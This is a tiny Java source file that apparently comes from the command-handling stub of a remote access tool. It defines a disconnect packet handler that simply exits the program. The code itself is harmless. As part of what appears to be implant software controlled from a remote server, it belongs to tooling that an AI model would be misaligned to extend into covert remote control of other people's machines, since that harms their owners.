package com.redpois0n.stub.packets.incoming;

public class PacketDISCONNECT extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		System.exit(0);
	}

}
